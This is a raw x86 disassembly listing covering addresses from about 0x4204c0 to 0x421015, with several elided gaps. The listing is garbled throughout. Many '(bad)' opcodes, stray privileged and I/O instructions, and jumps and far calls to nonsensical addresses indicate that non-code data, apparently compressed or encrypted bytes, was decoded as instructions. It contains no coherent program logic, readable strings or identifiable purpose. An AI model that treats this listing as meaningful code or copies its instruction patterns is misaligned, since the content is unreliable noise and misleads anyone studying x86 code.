  4204c0:	jns    0x4204c2
	...
  420532:	add    BYTE PTR [eax],al
  420534:	js     0x42056a
  420536:	add    bh,bl
  420538:	dec    esi
  420539:	(bad)  
  42053a:	stc    
  42053b:	mov    bh,0x14
  42053d:	clc    
  42053e:	add    al,0xe1
  420540:	daa    
  420541:	push   ds
  420542:	js     0x4205ab
  420544:	dec    esi
  420545:	pop    edx
  420546:	add    DWORD PTR [eax],eax
  420548:	cmc    
  420549:	add    BYTE PTR [eax],al
  42054b:	add    BYTE PTR [edi],dh
  42054d:	dec    eax
  42054e:	int    0x7
  420550:	scas   al,BYTE PTR es:[edi]
  420551:	jle    0x420546
  420553:	fmul   DWORD PTR [esi-0x4c212764]
  420559:	push   ss
  42055a:	adc    BYTE PTR [edi],0x40
  42055d:	xor    dl,BYTE PTR [esi+0x5eca76c5]
  420563:	add    esi,esi
  420565:	(bad)  
  420566:	adc    al,BYTE PTR [ebx-0x4f]
  420569:	xchg   edx,eax
  42056a:	pop    eax
  42056b:	nop
  42056c:	cmp    cl,BYTE PTR [ebp+0x1936c067]
  420572:	xchg   edi,eax
  420573:	cs cld 
  420575:	fs call 0xaa93:0xac396d2e
  42057d:	lods   eax,DWORD PTR ds:[esi]
  42057e:	in     al,0x58
  420580:	mov    al,ds:0x2b82e3d
  420585:	scas   al,BYTE PTR es:[edi]
  420586:	dec    eax
  420587:	jg     0x4205e1
  420589:	sbb    esi,DWORD PTR [ebx+0x19]
  42058c:	fcomp  st(2)
  42058e:	push   cs
  42058f:	sbb    DWORD PTR ds:0x35a09090,ebx
  420595:	enter  0xeb4b,0xce
  420599:	push   cs
  42059a:	sub    DWORD PTR [ebx+eiz*2],ebp
  42059d:	inc    ebx
  42059e:	jmp    0x15d1539b
  4205a3:	xchg   ecx,eax
  4205a4:	jmp    0x4205e2
  4205a6:	mov    bl,BYTE PTR [edi+0x36]
  4205a9:	shl    ah,0x3a
  4205ac:	or     eax,0x2e6c1308
  4205b1:	xchg   esp,eax
  4205b2:	inc    esp
  4205b3:	or     bl,bl
  4205b5:	mov    ah,0xcd
  4205b7:	shr    BYTE PTR [ecx+0x33],cl
  4205ba:	mov    fs,WORD PTR [edx]
  4205bc:	icebp  
  4205bd:	dec    esi
  4205be:	fsubr  QWORD PTR [eax-0x7]
  4205c1:	dec    DWORD PTR [ebp+ebx*8+0x43]
  4205c5:	sub    al,0xc8
  4205c7:	jmp    0x4205ca
  4205c9:	dec    ecx
  4205ca:	inc    ebp
  4205cb:	out    dx,al
  4205cc:	sti    
  4205cd:	aam    0x72
  4205cf:	push   ecx
  4205d0:	mov    dl,0x83
  4205d2:	out    0xab,eax
  4205d4:	or     ecx,DWORD PTR [ecx-0x42d159b3]
  4205da:	ror    DWORD PTR [edi-0x4bc55237],0x96
  4205e1:	shl    dl,1
  4205e3:	and    al,0xbf
  4205e5:	mov    bh,0x51
  4205e7:	dec    edi
  4205e8:	in     al,dx
  4205e9:	add    al,0x9c
  4205eb:	jle    0x420596
  4205ed:	out    dx,eax
  4205ee:	rol    BYTE PTR [esi-0x5c622f1a],0x17
  4205f5:	dec    esi
  4205f6:	xchg   edi,eax
  4205f7:	ret    0x824
  4205fa:	sub    bl,BYTE PTR [edx+ebx*4]
  4205fd:	or     edx,DWORD PTR [ebx+0x32]
  420600:	shr    BYTE PTR [esi],1
  420602:	int    0xfc
  420604:	mov    eax,0x8ba17e8
  420609:	fimul  WORD PTR [edi+0x30]
  42060c:	ja     0x4205e3
  42060e:	push   eax
  42060f:	or     DWORD PTR [esi],esi
  420611:	out    dx,al
  420612:	jmp    0x14beb448
  420617:	pop    ds
  420618:	stos   BYTE PTR es:[edi],al
  420619:	(bad)  
  42061a:	jnp    0x420660
  42061c:	adc    bl,dh
  42061e:	nop
  42061f:	ror    edx,0x2c
  420622:	and    DWORD PTR [ecx+0x2d],eax
  420625:	sbb    al,0xc4
  420627:	push   esp
  420628:	sbb    eax,0x2ba025dd
  42062d:	and    DWORD PTR [edx-0x6d],esp
  420630:	jae    0x420668
  420632:	mov    esi,eax
  420634:	cdq    
  420635:	inc    esp
  420636:	test   DWORD PTR [ebx-0x4b],edi
  420639:	adc    esi,eax
  42063b:	mov    ebx,eax
  42063d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42063e:	mov    edi,0xa6c3
	...
  4206b3:	add    BYTE PTR [edx-0x5081dcc4],dl
  4206b9:	jg     0x42069a
  4206bb:	cld    
  4206bc:	jo     0x4206a6
  4206be:	hlt    
  4206bf:	leave  
  4206c0:	repnz popf 
  4206c2:	icebp  
  4206c3:	sbb    eax,DWORD PTR [ebx+0x5b]
  4206c6:	add    DWORD PTR [eax],eax
  4206c8:	cmc    
  4206c9:	add    BYTE PTR [eax],al
  4206cb:	add    BYTE PTR [ebx+0x1153befc],bh
  4206d1:	enter  0xb760,0xee
  4206d5:	repnz dec eax
  4206d7:	popa   
  4206d8:	mov    BYTE PTR [ebx],bh
  4206da:	add    ch,0x91
  4206dd:	adc    eax,0xdb2a55d8
  4206e2:	sub    BYTE PTR [ebx+0x35],ah
  4206e5:	out    dx,al
  4206e6:	sbb    DWORD PTR [ecx-0x5794ee70],esp
  4206ec:	dec    eax
  4206ed:	in     eax,dx
  4206ee:	push   edx
  4206ef:	fs dec edi
  4206f1:	repnz xlat BYTE PTR ds:[ebx]
  4206f3:	xor    al,0xff
  4206f5:	mov    DWORD PTR [edx],edi
  4206f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206f8:	popa   
  4206f9:	fadd   st,st(7)
  4206fb:	scas   al,BYTE PTR es:[edi]
  4206fc:	out    0x2f,al
  4206fe:	push   ebx
  4206ff:	xchg   edi,eax
  420700:	hlt    
  420701:	fwait
  420702:	xor    eax,0xf1d92412
  420707:	mov    ds:0xde363469,al
  42070c:	xchg   BYTE PTR ds:0x8af5a6fe,ah
  420712:	ret    0x171b
  420715:	add    DWORD PTR [ebp+0x3162ce11],ebx
  42071b:	inc    ebx
  42071c:	call   0x245cca4c
  420721:	fdecstp 
  420723:	mov    ds:0x57189a51,eax
  420728:	test   eax,0x5da817c8
  42072d:	rcl    DWORD PTR [esi+0x720c7d89],cl
  420733:	sub    ecx,ebx
  420735:	repz jo 0x420798
  420738:	scas   al,BYTE PTR es:[edi]
  420739:	repnz loop 0x4207b8
  42073c:	add    al,0xd
  42073e:	sbb    al,0x2
  420740:	in     al,dx
  420741:	sub    eax,0x3071f35
  420746:	cmp    esp,eax
  420748:	cwde   
  420749:	scas   al,BYTE PTR es:[edi]
  42074a:	js     0x4207b9
  42074c:	imul   ecx,ebp,0x4f511974
  420752:	adc    ch,al
  420754:	jmp    0x4207ce
  420756:	pop    ebx
  420757:	adc    eax,0x87cc87df
  42075c:	pop    esi
  42075d:	xor    bl,BYTE PTR [edi-0x6f]
  420760:	ja     0x4207c1
  420762:	jge    0x42077f
  420764:	sub    al,0x4
  420766:	int3   
  420767:	pop    ebp
  420768:	(bad)  
  420769:	fsubr  st(6),st
  42076b:	mov    eax,0xb509e62a
  420770:	jmp    0xa8f2:0xe2fe94c5
  420777:	adc    DWORD PTR [ebx],ebx
  420779:	pop    esp
  42077a:	test   al,0x8a
  42077c:	add    ah,BYTE PTR [ecx-0x14905032]
  420782:	jae    0x4207bb
  420784:	xchg   esi,eax
  420785:	repnz mov esi,0xc58f85c4
  42078b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42078c:	cmp    esi,DWORD PTR [ebx+0xd]
  42078f:	mov    edx,0xf1672bdb
  420794:	nop
  420795:	push   0x1d
  420797:	mov    ecx,0xf057d39
  42079c:	sbb    DWORD PTR [ecx-0x6a],ebp
  42079f:	pusha  
  4207a0:	jge    0x42078e
  4207a2:	pop    es
  4207a3:	std    
  4207a4:	mov    ebx,0x78df30d7
  4207a9:	fs test eax,0x40067fec
  4207af:	das    
  4207b0:	repz scas eax,DWORD PTR es:[edi]
  4207b2:	retf   
  4207b3:	repz je 0x42080b
  4207b6:	bound  ebp,QWORD PTR [esi+0x35aab985]
  4207bc:	pusha  
  4207bd:	jle    0x420774
  4207bf:	cmp    eax,0x93
	...
  420834:	mov    eax,ds:0x3b920b9a
  420839:	xchg   ebx,eax
  42083a:	mov    ecx,0xafa823bb
  42083f:	mov    bh,0xb8
  420841:	call   0x5c7a144a
  420846:	add    DWORD PTR [eax],eax
  420848:	cmc    
  420849:	add    BYTE PTR [eax],al
  42084b:	add    BYTE PTR [edi+0x68],ch
  42084e:	stc    
  42084f:	mov    edx,0x963deacc
  420854:	retf   0xc5e7
  420857:	lods   al,BYTE PTR ds:[esi]
  420858:	frstor [eax-0x4ff1735]
  42085e:	in     eax,0x94
  420860:	xor    BYTE PTR [ebx+0x67],dl
  420863:	retf   0x3edf
  420866:	add    cl,BYTE PTR [esi-0x3e45472a]
  42086c:	add    ebp,DWORD PTR [ebp-0x56]
  42086f:	rcl    DWORD PTR [eax*1+0x15d05f49],cl
  420876:	add    eax,0xfbc4c1be
  42087b:	jg     0x42086e
  42087d:	imul   esp,eax,0xb79cc348
  420883:	xor    bh,BYTE PTR [esi]
  420885:	xor    DWORD PTR [ebp+eax*1-0x6d],ebx
  420889:	sbb    eax,0x87b15d5d
  42088e:	(bad)  
  42088f:	mov    esi,0xf7ef9fc9
  420894:	pop    esi
  420895:	int3   
  420896:	add    DWORD PTR [edx-0x13c7aacf],0x9cd0c18b
  4208a0:	add    BYTE PTR [ecx],dh
  4208a2:	xchg   edx,eax
  4208a3:	mov    edx,0x4608c197
  4208a8:	sub    BYTE PTR [esi-0x4e35a77],bl
  4208ae:	fbstp  TBYTE PTR [ebp+0x52d1c94c]
  4208b4:	mov    edx,0x7125a52b
  4208b9:	xor    BYTE PTR [edx-0x89621cc],ah
  4208bf:	ja     0x4208de
  4208c1:	lds    ebp,FWORD PTR [edi-0x6e]
  4208c4:	sub    eax,0xd5c230af
  4208c9:	mov    eax,0x747898b8
  4208ce:	sar    BYTE PTR [esi-0x14],cl
  4208d1:	je     0x4208f4
  4208d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208d4:	pop    edx
  4208d5:	cmp    eax,0xdc120123
  4208da:	mov    bl,0x6c
  4208dc:	out    0x4,eax
  4208de:	lods   al,BYTE PTR ds:[esi]
  4208df:	loop   0x42092d
  4208e1:	jnp    0x420915
  4208e3:	or     al,0x71
  4208e5:	fs (bad) 
  4208e7:	and    edi,DWORD PTR ds:[edx+edx*2]
  4208eb:	fld    DWORD PTR [ebx+0x198541a1]
  4208f1:	xor    edi,DWORD PTR [edi-0x16]
  4208f4:	mov    BYTE PTR ds:0x4bf15081,0x89
  4208fb:	inc    ebp
  4208fc:	mov    eax,ds:0xd0479733
  420901:	xchg   ebx,eax
  420902:	dec    ecx
  420903:	rol    BYTE PTR [esi],1
  420905:	(bad)  
  420906:	in     eax,dx
  420907:	test   DWORD PTR ds:0x38984ce8,edi
  42090d:	add    al,bl
  42090f:	sub    al,0xa6
  420911:	sbb    DWORD PTR [edi+0x78e8162c],esi
  420917:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420918:	fwait
  420919:	or     bh,BYTE PTR [edx+eiz*1+0x63]
  42091d:	jae    0x4208a4
  42091f:	sub    dl,cl
  420921:	adc    BYTE PTR [ebx-0x20],al
  420924:	cli    
  420925:	push   ss
  420926:	xchg   ebx,eax
  420927:	das    
  420928:	sub    ebp,DWORD PTR [esi-0x602f2dc3]
  42092e:	ins    DWORD PTR es:[edi],dx
  42092f:	mov    eax,ds:0xb4e95182
  420934:	outs   dx,BYTE PTR ds:[esi]
  420935:	add    bl,al
  420937:	add    eax,0xf6c12b85
  42093c:	push   esp
  42093d:	mov    al,ds:0xfa56d8
	...
  4209b2:	add    BYTE PTR [eax],al
  4209b4:	or     al,BYTE PTR [ecx-0x49]
  4209b7:	mov    eax,ds:0xeb1ef7ff
  4209bc:	rcr    BYTE PTR [esi+0x5b7166de],0x29
  4209c3:	shr    BYTE PTR ds:0xf500015d,1
  4209c9:	add    BYTE PTR [eax],al
  4209cb:	add    BYTE PTR [ebx],dh
  4209cd:	mov    ebx,0xcb551ce4
  4209d2:	clc    
  4209d3:	ret    0xb4fe
  4209d6:	jne    0x420a37
  4209d8:	add    eax,0x96a1ae1f
  4209dd:	js     0x420a57
  4209df:	push   es
  4209e0:	(bad)  
  4209e1:	pop    ds
  4209e2:	fdivr  DWORD PTR [eax]
  4209e4:	add    eax,0x84026b8a
  4209e9:	shl    DWORD PTR ds:0x1036a77c,cl
  4209ef:	aam    0xd6
  4209f1:	fs add ebp,esp
  4209f4:	ss sar bl,1
  4209f7:	les    ebp,FWORD PTR ss:[eax]
  4209fa:	adc    DWORD PTR [esi-0x3e],edi
  4209fd:	sbb    al,0x30
  4209ff:	arpl   WORD PTR ds:0xf5b659b5,bp
  420a05:	js     0x420a33
  420a07:	iret   
  420a08:	test   eax,0x8aab6e48
  420a0d:	retf   0x60ca
  420a10:	push   edx
  420a11:	cmp    al,0x99
  420a13:	push   eax
  420a14:	ins    DWORD PTR es:[edi],dx
  420a15:	mov    ebx,0x6244db63
  420a1a:	pop    edi
  420a1b:	repnz aaa 
  420a1d:	mov    eax,0xb6ece7fa
  420a22:	pusha  
  420a23:	and    DWORD PTR [edx],ebp
  420a25:	aad    0x20
  420a27:	les    esi,FWORD PTR [ecx-0x53]
  420a2a:	sti    
  420a2b:	test   eax,0xde39d4a1
  420a30:	inc    ecx
  420a31:	ds inc ecx
  420a33:	cmp    al,BYTE PTR [ebx+eax*1+0x61]
  420a37:	mov    dh,0x9c
  420a39:	push   esp
  420a3b:	jb     0x420a8e
  420a3d:	push   es
  420a3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a3f:	repz adc al,0x80
  420a42:	call   0x72c0:0x82accb38
  420a49:	test   eax,0x8f86c3bf
  420a4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a4f:	cmp    BYTE PTR [edi+ebp*1],ah
  420a52:	into   
  420a53:	add    al,0xa8
  420a55:	test   BYTE PTR [edi],0xf0
  420a58:	mov    bl,0x4
  420a5a:	mov    ds:0x40f3c0a4,al
  420a5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a60:	mov    dl,BYTE PTR [ecx]
  420a62:	(bad)  
  420a63:	lea    eax,[eax-0x4d]
  420a66:	js     0x420a57
  420a68:	pop    esp
  420a69:	sub    ebp,ecx
  420a6b:	cmp    dl,ch
  420a6d:	fsubrp st(6),st
  420a6f:	js     0x420aaf
  420a71:	mov    ecx,0xa7060302
  420a76:	int3   
  420a77:	mov    esp,0xa4e7e91f
  420a7c:	and    BYTE PTR [ebx-0x3f],0x0
  420a80:	daa    
  420a81:	idiv   eax
  420a83:	lods   eax,DWORD PTR ds:[esi]
  420a84:	mov    edi,0xbb19f66d
  420a89:	outs   dx,DWORD PTR ds:[esi]
  420a8a:	ss and eax,0x68b6cf49
  420a90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a91:	ret    0xae32
  420a94:	jnp    0x420a1e
  420a96:	cmp    bl,cl
  420a98:	out    dx,al
  420a99:	inc    ecx
  420a9a:	lea    eax,[ebp+0x7047daab]
  420aa0:	pop    ss
  420aa1:	dec    ebp
  420aa2:	sub    ah,BYTE PTR [eax-0x49]
  420aa5:	mov    bh,BYTE PTR [eax]
  420aa7:	loop   0x420a8a
  420aa9:	mov    DWORD PTR [edi+0x22],esi
  420aac:	mov    bl,0xb9
  420aae:	and    bl,ch
  420ab0:	jmp    0x420aef
  420ab2:	pop    ebx
  420ab3:	sbb    bh,BYTE PTR [edx]
  420ab5:	es pop eax
  420ab7:	cli    
  420ab8:	in     eax,0x54
  420aba:	jns    0x420adb
  420abc:	inc    BYTE PTR [edx]
  420abe:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  420ac0:	dec    ecx
	...
  420b31:	add    BYTE PTR [eax],al
  420b33:	add    ah,bl
  420b35:	sub    BYTE PTR [edx-0x119011c],cl
  420b3b:	cmp    BYTE PTR [edi+0x39],dl
  420b3e:	dec    edx
  420b3f:	(bad)  
  420b41:	enter  0xa9e0,0x22
  420b45:	pop    esi
  420b46:	add    DWORD PTR [eax],eax
  420b48:	cmc    
  420b49:	add    BYTE PTR [eax],al
  420b4b:	add    BYTE PTR [esi-0x35632e94],al
  420b51:	data16 cmp al,0x6b
  420b54:	mov    DWORD PTR [ebx],esi
  420b56:	push   cs
  420b57:	inc    eax
  420b58:	cwde   
  420b59:	inc    esp
  420b5a:	or     eax,0x9c823a66
  420b5f:	push   ds
  420b60:	imul   DWORD PTR [bx+si+0x45]
  420b64:	mov    ds:0x6161cf55,eax
  420b69:	pop    edi
  420b6a:	add    al,0x22
  420b6c:	mov    al,0xa4
  420b6e:	pushf  
  420b6f:	test   eax,0x7962a71d
  420b74:	xlat   BYTE PTR ds:[ebx]
  420b75:	fstp   DWORD PTR [ebx+edi*2]
  420b78:	imul   ecx,DWORD PTR [eax+0x22c87911],0x10
  420b7f:	inc    eax
  420b80:	or     eax,0xc2d0bc9a
  420b85:	push   ebx
  420b86:	sub    bh,cl
  420b88:	(bad)  
  420b89:	out    dx,al
  420b8a:	mov    al,ds:0x2b33f7b2
  420b8f:	les    esi,FWORD PTR [esi-0x2e]
  420b92:	xor    eax,ebx
  420b94:	pop    edx
  420b95:	ins    BYTE PTR es:[edi],dx
  420b96:	js     0x420bce
  420b98:	shr    BYTE PTR ds:0x76c52188,cl
  420b9e:	dec    ebx
  420b9f:	or     BYTE PTR [ecx+ebp*2-0x4a],cl
  420ba3:	push   ecx
  420ba4:	ret    
  420ba5:	xor    al,0x92
  420ba7:	or     eax,0xade082e4
  420bac:	shr    dl,1
  420bae:	mov    bh,0x50
  420bb0:	push   ecx
  420bb1:	push   ecx
  420bb2:	inc    esp
  420bb3:	push   ds
  420bb4:	mov    al,0x65
  420bb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bb7:	fbld   TBYTE PTR [esp+ebp*2]
  420bba:	sbb    esi,DWORD PTR [eax+0x35]
  420bbd:	sbb    al,0x9e
  420bbf:	rol    DWORD PTR [edi+0x56],0x34
  420bc3:	repnz scas eax,DWORD PTR es:[edi]
  420bc5:	sub    dl,ch
  420bc7:	fcomi  st,st(1)
  420bc9:	mov    eax,DWORD PTR [edi-0x522fd564]
  420bcf:	(bad)  
  420bd0:	xchg   ebx,eax
  420bd1:	sbb    esi,DWORD PTR [edi-0x32]
  420bd4:	pop    edx
  420bd5:	push   es
  420bd6:	push   ss
  420bd7:	jecxz  0x420b71
  420bd9:	mov    ebx,edi
  420bdb:	inc    esi
  420bdc:	xor    DWORD PTR [ebp+0x31024dde],ecx
  420be2:	lods   al,BYTE PTR ds:[esi]
  420be3:	xchg   esi,eax
  420be4:	rol    BYTE PTR [esi-0xe],cl
  420be7:	push   DWORD PTR [ebx-0x1a15e68b]
  420bed:	ret    
  420bee:	dec    ebx
  420bef:	mov    dh,0xf3
  420bf1:	xor    al,0x41
  420bf3:	jmp    0xebce8dd9
  420bf8:	cmp    bh,BYTE PTR [eax+0x2e01cb55]
  420bfe:	int    0xef
  420c00:	pop    ss
  420c01:	out    0xe2,al
  420c03:	repz pop edx
  420c05:	xchg   esi,eax
  420c06:	mul    dh
  420c08:	mov    ch,0xce
  420c0a:	adc    al,0xb
  420c0c:	out    0xf,eax
  420c0e:	jne    0x420c49
  420c10:	sbb    eax,0x50449fc7
  420c15:	enter  0x8181,0x1e
  420c19:	fcmove st,st(0)
  420c1b:	mov    eax,0xf0887f9f
  420c20:	mov    ecx,0x5f26146d
  420c25:	fadd   QWORD PTR [edx+0x59e652b7]
  420c2b:	je     0x420c6c
  420c2d:	or     eax,0xc379575
  420c32:	cmp    edi,DWORD PTR [ecx-0x6f722e45]
  420c38:	mov    esi,0x4f84b296
  420c3d:	dec    edx
  420c3e:	test   eax,0x4de4
	...
  420cb3:	add    BYTE PTR [edx+ebp*2],cl
  420cb6:	push   edx
  420cb7:	shl    DWORD PTR [esi-0x7],0x9f
  420cbb:	out    dx,eax
  420cbc:	xchg   ecx,eax
  420cbd:	inc    ecx
  420cbe:	push   0x6cbab35f
  420cc3:	mov    dh,0x17
  420cc5:	pop    edi
  420cc6:	add    DWORD PTR [eax],eax
  420cc8:	cmc    
  420cc9:	add    BYTE PTR [eax],al
  420ccb:	add    BYTE PTR [esi-0x37],dh
  420cce:	sub    eax,0xfa393a1d
  420cd3:	sbb    ecx,DWORD PTR [ecx+0x5d0a366a]
  420cd9:	and    al,0xe4
  420cdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420cdc:	mov    bl,0x27
  420cde:	rcr    DWORD PTR [ebp-0x75],1
  420ce1:	dec    edx
  420ce2:	and    ebx,edi
  420ce4:	add    eax,0xaf2a0c08
  420ce9:	push   ebp
  420cea:	je     0x420c96
  420cec:	jle    0x420d30
  420cee:	cmp    BYTE PTR [ebx],al
  420cf0:	mov    ds:0x7eca2638,al
  420cf5:	arpl   WORD PTR es:[edx+ebp*4+0x5f15bfaa],di
  420cfd:	jmp    0xec180b51
  420d02:	outs   dx,BYTE PTR ds:[esi]
  420d03:	sar    BYTE PTR [esi+edx*4+0x6d],cl
  420d07:	jl     0x420d2a
  420d09:	mov    cs,WORD PTR [ebp+0x30fa4fc6]
  420d0f:	pop    ebx
  420d10:	mov    eax,0xc2e9ec0e
  420d15:	jno    0x420d3f
  420d17:	jnp    0x420d2a
  420d19:	std    
  420d1a:	loopne 0x420d04
  420d1c:	ficom  WORD PTR [eax+0x2942f7b7]
  420d22:	xor    ch,BYTE PTR [ebx+edx*2]
  420d25:	sbb    esi,DWORD PTR [eax+0x5fb19d4c]
  420d2b:	push   edx
  420d2c:	mov    bl,0x7e
  420d2e:	leave  
  420d2f:	std    
  420d30:	test   DWORD PTR [edx-0x2],esp
  420d33:	mov    BYTE PTR [ebx],dh
  420d35:	(bad)  
  420d36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d37:	retf   0x9788
  420d3a:	outs   dx,DWORD PTR ds:[esi]
  420d3b:	add    bl,BYTE PTR [ecx-0x6f]
  420d3e:	fs cli 
  420d40:	add    al,BYTE PTR [eax+0x4ceb0c23]
  420d46:	inc    ebp
  420d47:	sar    BYTE PTR [esi+0x339612e9],1
  420d4d:	mov    al,ds:0xffbc071d
  420d52:	jno    0x420ce2
  420d54:	pusha  
  420d55:	inc    edi
  420d56:	and    al,0x26
  420d58:	iret   
  420d59:	ins    BYTE PTR es:[edi],dx
  420d5a:	ror    BYTE PTR [esp+ecx*4+0x5952e48],1
  420d61:	addr16 dec edx
  420d63:	fcom   DWORD PTR [esi-0x51]
  420d66:	adc    BYTE PTR ds:0x3ff6d54e,ch
  420d6c:	or     DWORD PTR [edx+0x55ca7eae],edx
  420d72:	test   eax,0x7bde1794
  420d77:	pop    ebx
  420d78:	dec    esi
  420d79:	sahf   
  420d7a:	add    dh,BYTE PTR [edi+edi*8+0x20]
  420d7e:	in     eax,0xf5
  420d80:	push   edx
  420d81:	iret   
  420d82:	xchg   ebx,eax
  420d83:	lods   eax,DWORD PTR ds:[esi]
  420d84:	dec    esp
  420d85:	repz push ebx
  420d87:	or     al,0x3f
  420d89:	add    al,0xe4
  420d8b:	or     BYTE PTR [ecx],dl
  420d8d:	fnstcw WORD PTR [edx+0xd4c8a7e]
  420d93:	xchg   ecx,eax
  420d94:	or     bh,BYTE PTR [ecx+eiz*2+0x4ea17328]
  420d9b:	in     eax,dx
  420d9c:	inc    edi
  420d9d:	js     0x420e11
  420d9f:	fistp  QWORD PTR [ecx+0x23f86596]
  420da5:	mov    ecx,0x709b7a5c
  420daa:	xchg   esi,eax
  420dab:	add    dl,BYTE PTR [edx+eax*1-0x7e]
  420daf:	mov    cl,0xf2
  420db1:	test   DWORD PTR [eax-0x7e646ab1],ebp
  420db7:	popa   
  420db8:	popa   
  420db9:	jae    0x420d6f
  420dbb:	xchg   ebx,eax
  420dbc:	retf   
  420dbd:	xchg   ebx,eax
  420dbe:	dec    eax
  420dbf:	in     al,dx
  420dc0:	pop    edi
	...
  420e31:	add    BYTE PTR [eax],al
  420e33:	add    BYTE PTR [edx-0x1865ab],ch
  420e39:	out    dx,eax
  420e3a:	call   FWORD PTR [ebp+0x64]
  420e3d:	inc    ebx
  420e3e:	and    edx,ecx
  420e40:	push   ecx
  420e41:	pop    edx
  420e42:	cs push esp
  420e44:	or     al,0x60
  420e46:	add    DWORD PTR [eax],eax
  420e48:	cmc    
  420e49:	add    BYTE PTR [eax],al
  420e4b:	add    BYTE PTR [ecx+edi*8-0x11],ah
  420e4f:	push   ds
  420e50:	xor    BYTE PTR [ebx-0x77],bl
  420e53:	mov    DWORD PTR [edi+edx*1],ebp
  420e56:	xor    BYTE PTR [eax+0x1a],al
  420e59:	sar    BYTE PTR [esi-0x5ce784f5],1
  420e5f:	lea    edx,[edi+0x62]
  420e62:	out    dx,al
  420e63:	mov    al,ds:0x53dbb71
  420e68:	push   es
  420e69:	jo     0x420e8d
  420e6b:	loopne 0x420dfc
  420e6d:	int3   
  420e6e:	iret   
  420e6f:	mov    esp,0xec168145
  420e74:	sti    
  420e75:	loop   0x420e86
  420e77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e78:	xor    DWORD PTR [edx+ebx*2],esi
  420e7b:	adc    cl,BYTE PTR [ecx]
  420e7d:	test   al,0x74
  420e7f:	add    eax,DWORD PTR [edx+0x52f67735]
  420e85:	repz fcomip st,st(0)
  420e88:	sub    BYTE PTR [ebp-0x5f8754c5],ah
  420e8e:	or     al,0x25
  420e90:	adc    BYTE PTR [eax],bl
  420e92:	test   DWORD PTR [edx+0x44],esp
  420e95:	loope  0x420ed9
  420e97:	lock loope 0x420e26
  420e9a:	packssdw mm6,QWORD PTR [eax-0x11]
  420e9e:	shl    edi,cl
  420ea0:	dec    esi
  420ea1:	sbb    eax,0x407f7a9a
  420ea6:	dec    esi
  420ea7:	xchg   ebp,ecx
  420ea9:	jno    0x420eb1
  420eab:	sub    BYTE PTR [edi+ecx*4-0x498aca3d],bh
  420eb2:	xor    dh,BYTE PTR [ebx-0x78906608]
  420eb8:	xchg   ecx,eax
  420eb9:	rcr    cl,1
  420ebb:	sahf   
  420ebc:	popf   
  420ebd:	sub    eax,0xffffff99
  420ec0:	fdivr  DWORD PTR [edx+0x36]
  420ec3:	fsubr  DWORD PTR [ecx-0x42]
  420ec6:	mov    eax,0xc80959c2
  420ecb:	jns    0x420e73
  420ecd:	mov    eax,ds:0x4888fb9a
  420ed2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ed3:	lea    edi,[eax+0x17967032]
  420ed9:	bound  ebp,QWORD PTR [eax+0x38]
  420edc:	pop    esp
  420edd:	jno    0x420f09
  420edf:	mov    ebp,es
  420ee1:	in     al,dx
  420ee2:	daa    
  420ee3:	call   0x8454ec74
  420ee8:	outs   dx,DWORD PTR ds:[esi]
  420ee9:	sub    al,0x7f
  420eeb:	call   0xae7bfbf1
  420ef0:	mov    edx,esi
  420ef2:	xor    dl,dh
  420ef4:	rcl    DWORD PTR [ebp+eiz*8-0x58],1
  420ef8:	sahf   
  420ef9:	add    BYTE PTR [ebx+0x4e],cl
  420efc:	outs   dx,BYTE PTR ds:[esi]
  420efd:	pusha  
  420efe:	add    DWORD PTR [ecx+0x26],esi
  420f01:	jle    0x420ed9
  420f03:	pop    esp
  420f04:	ror    BYTE PTR [edi-0x3eb69045],cl
  420f0a:	jo     0x420ef1
  420f0c:	mov    esp,0xad1eb71
  420f11:	out    dx,al
  420f12:	(bad)  
  420f13:	seta   BYTE PTR [si]
  420f17:	push   ss
  420f18:	iret   
  420f19:	mov    ?,ecx
  420f1b:	test   DWORD PTR [edx-0x56],ecx
  420f1e:	(bad)
  420f21:	imul   esp,DWORD PTR [edx],0xffffff83
  420f24:	pop    eax
  420f25:	adc    eax,0x3c4fc8eb
  420f2a:	and    DWORD PTR [ebp+0xb],edx
  420f2d:	push   esp
  420f2e:	rol    BYTE PTR [edi+0xfa82c66],0x21
  420f35:	and    al,0x69
  420f37:	mov    bl,0xaf
  420f39:	jnp    0x420f5f
  420f3b:	mov    eax,ds:0x3b3cc0e1
  420f40:	jecxz  0x420f42
	...
  420fb2:	add    BYTE PTR [eax],al
  420fb4:	bound  esp,QWORD PTR [ebp-0x8808a]
  420fba:	imul   edi,DWORD PTR [ebp-0x6d53d0f4],0x3d
  420fc1:	pop    ecx
  420fc2:	xor    DWORD PTR [edx],0x1
  420fc5:	popa   
  420fc6:	add    DWORD PTR [eax],eax
  420fc8:	cmc    
  420fc9:	add    BYTE PTR [eax],al
  420fcb:	add    BYTE PTR [esi-0x13455f39],bh
  420fd1:	sub    esp,DWORD PTR [ebp+ebp*4+0x7d]
  420fd5:	pop    esi
  420fd6:	bnd js 0x421033
  420fd9:	sbb    esi,DWORD PTR [ebp+esi*8-0x100f813c]
  420fe0:	jno    0x420fc2
  420fe2:	bound  ebp,QWORD PTR [esi]
  420fe4:	imul   ecx,DWORD PTR [edi-0x49],0xffffff9b
  420fe8:	xchg   ebx,eax
  420fe9:	sbb    eax,0xb9236ef4
  420fee:	xor    al,0x5d
  420ff0:	jle    0x421068
  420ff2:	cmp    eax,0x435c185
  420ff7:	lods   al,BYTE PTR ds:[esi]
  420ff8:	leave  
  420ff9:	mov    ebp,0xef86930d
  420ffe:	retf   0x46b4
  421001:	ficomp DWORD PTR [ebp-0x5f847ee1]
  421007:	adc    al,0xec
  421009:	add    eax,0x2792a33
  42100e:	sbb    BYTE PTR [ecx+0x59dc468],cl
  421014:	push   ss
  421015:	in     eax,0xdf
